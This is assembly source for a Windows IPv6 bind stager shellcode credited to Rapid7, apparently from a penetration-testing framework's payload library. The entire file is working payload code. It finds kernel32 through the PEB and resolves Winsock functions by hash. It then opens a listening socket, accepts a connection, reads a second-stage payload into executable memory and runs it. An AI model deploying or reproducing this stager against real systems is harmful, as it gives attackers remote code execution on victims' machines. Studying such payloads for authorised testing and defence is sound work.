;      Title:  Windows Bind Stager (NX, IPv6)
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  Rapid7, Inc

[BITS 32]

global _start
_start:

    call LKernel32Base

LGetProcAddress:
	push ebx
	push ebp
	push esi
	push edi
	mov ebp, [esp + 24]			
	mov eax, [ebp + 0x3c]		
	mov edx, [ebp + eax + 120]
	add edx, ebp				
	mov ecx, [edx + 24]			
	mov ebx, [edx + 32]
	add ebx, ebp

LFnlp:
	jecxz	LNtfnd
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp				
	xor edi, edi
	cld

LHshlp:
	xor eax, eax
	lodsb
	cmp al, ah
	je LFnd
	ror edi, 13
	add edi, eax
	jmp short LHshlp

LFnd:	
	cmp edi, [esp + 20]
	jnz LFnlp
	mov ebx, [edx + 36]			
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]		
	mov ebx, [edx + 28]			
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]	
	add eax, ebp
	jmp short LDone

LNtfnd:
	xor eax, eax

LDone:
	pop edi
	pop esi
	pop ebp
	pop ebx
	ret 8

LKernel32Base:
	xor edx, edx
	mov edx, [fs:edx+0x30] ; get a pointer to the PEB
	mov edx, [edx+0x0C]    ; get PEB->Ldr
	mov edx, [edx+0x14]    ; get PEB->Ldr.InMemoryOrderModuleList.Flink
next_mod:
	mov esi, [edx+0x28]    ; get pointer to modules name (unicode string)
	push byte 24           ; push down the length we want to check
	pop ecx                ; set ecx to this length for the loop
	xor edi, edi           ; clear edi which will store the hash of the module name
loop_modname:
	xor eax, eax           ; clear eax
	lodsb                  ; read in the next byte of the name
	cmp al, 'a'            ; some versions of Windows use lower case module names
	jl not_lowercase       ; 
	sub al, 0x20           ; if so normalise to uppercase
not_lowercase:           ; 
	ror edi, 13            ; rotate left our hash value
	add edi, eax           ; add the next byte of the name
	loop loop_modname      ; loop untill we have read enough
	cmp edi, 0x6A4ABC5B    ; compare the hash with that of kernel32.dll
	mov ebx, [edx+0x10]    ; get this modules base address
	mov edx, [edx]         ; get the next module
	jne next_mod           ; if it doesnt match, process the next module
	pop esi

    push ebx                ; kernel32.dll base
    push dword 0xec0e4e8e   ; LoadLibraryA
    call esi                ; GetProcAddress(kerne32.dll, LoadLibrary)
    mov edi, eax
	
    push ebx                ; kernel32.dll base
    push dword 0x91afca54   ; VirtualAlloc
    call esi                ; GetProcAddress(kerne32.dll, VirtualAlloc)
   
    ; ebx = kernel32.dll base
    ; esi = LGetProcAddress
    ; edi = LoadLibraryA
    ; eax = VirtualAlloc

sub esp, 0x100
push eax    ; [ebp + 12] = VirtualAlloc
push edi    ; [ebp +  8] = LoadLibraryA
push esi    ; [ebp +  4] = LGetProcAddress
push ebx    ; [ebp +  0] = kernel32.dll base
            
mov ebp, esp
call LLoadWinsock

%define FN_RECV     [ebp + 24]
%define FN_SETSOCKOPT [ebp + 28]
%define FN_ACCEPT   [ebp + 32]
%define FN_BIND     [ebp + 36]
%define FN_LISTEN   [ebp + 40]
%define FN_WSASOCK  [ebp + 44]
%define FN_WSASTART [ebp + 48]

LWSDataSegment:
;========================
dd 0x190      ; used by wsastartup
dd 0xe71819b6 ; recv        [ebp + 24]
dd 0xc055f2ec ; setsockopt  [ebp + 28]
dd 0x498649e5 ; accept      [ebp + 32]
dd 0xc7701aa4 ; bind        [ebp + 36]
dd 0xe92eada4 ; listen      [ebp + 40]
dd 0xadf509d9 ; WSASocketA  [ebp + 44]
dd 0x3bfcedcb ; WSAStartup  [ebp + 48]
db "WS2_32", 0x00
;========================

LLoadWinsock:
    pop ebx             ; save address to data in ebx
    lea ecx, [ebx + 32] ; find address of "WS2_32.DLL"
    push ecx            ; push address of "WS2_32.DLL"
    call edi            ; call LoadLibraryA("WS2_32.DLL")     
    mov edi, ebx        ; store base of data section in edi
    mov ebx, eax        ; store base of winsock in ebx
    lea esi, [ebp + 20] ; store base of function table
    push byte 7         ; load 7 functions by hash
    pop ecx             ; configure the counter

Looper:    
    push ecx                    ; save the counter
    push ebx                    ; dll handle
    push dword [edi + ecx * 4]  ; function hash value
    call [ebp + 4]              ; find the address
    pop ecx                     ; restore the counter
    mov [esi + ecx * 4], eax    ; stack segment to store addresses
    loop Looper

LWSAStartup:                    ; WSAStartup (0x0202, DATA)
	sub esp, [edi]
	push esp
	push dword 0x0202
	call FN_WSASTART
	xor eax, eax
    
LWSASocketA:                    ; WSASocketA (23,1,6,0,0,0)
	; dwFlags
	push eax

	; RESERVED
	push eax
	
	; PROTOCOL INFO
	push eax
	
	; PROTOCOL: IPPROTO_TCP
	push byte 6
	
	; TYPE: SOCK_STREAM
	push byte 1

	; FAMILY: AF_INET6
	push byte 23
	
	; WSASocket()
	call FN_WSASOCK
	mov edi, eax
	
	push byte 10           ; dwProtectionLevel = PROTECTION_LEVEL_UNRESTRICTED
	mov eax, esp           ; save an address for this
	push byte 4            ; sizeof(DWORD)
	push eax               ; pointer to PROTECTION_LEVEL_UNRESTRICTED
	push byte 23           ; IPV6_PROTECTION_LEVEL
	push byte 41           ; IPPROTO_IPV6 
	push edi               ; the socket
	call FN_SETSOCKOPT     ; setsockopt( sock, IPPROTO_IPV6, IPV6_PROTECTION_LEVEL, &dwProtectionLevel, sizeof(DWORD) );
	pop eax
    
LBind:

	; sin6_scope_id
	push dword 0x00000000
	xor ecx, ecx
		
	; sin6_addr = ::0
	push ecx
	push ecx
	push ecx
	push ecx
	
	; sin6_flowinfo
	push ecx
	
	; sin6_port / sin6_family
	push dword 0xffff0017

    mov ecx, esp

    push byte 28        ; length
    push ecx
    push edi
    call FN_BIND

    xor ebx, ebx
	
LListen:
    push ebx
    push edi
    call FN_LISTEN

LAccept:
    push ebx
    push ebx 
    push edi
    call FN_ACCEPT
    mov edi, eax

LAllocateMemory: ; VirtualAlloc(NULL,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)

	push byte      0x40
	pop esi
	push esi                ; PAGE_EXECUTE_READWRITE=0x40

	shl esi, 6              ; MEM_COMMIT=0x1000
	push esi

	shl esi, 8              ; 1MB
	push esi
	
	push byte      0x00     ; NULL
	call [ebp+12]
	mov ebx, eax
	

LRecvLength: ; recv(s, buff, 4, 0)
    push byte 0x00          ; flags
    push dword 4096         ; length
    push ebx                ; buffer
    push dword edi          ; socket
    call FN_RECV            ; recv()
    call ebx
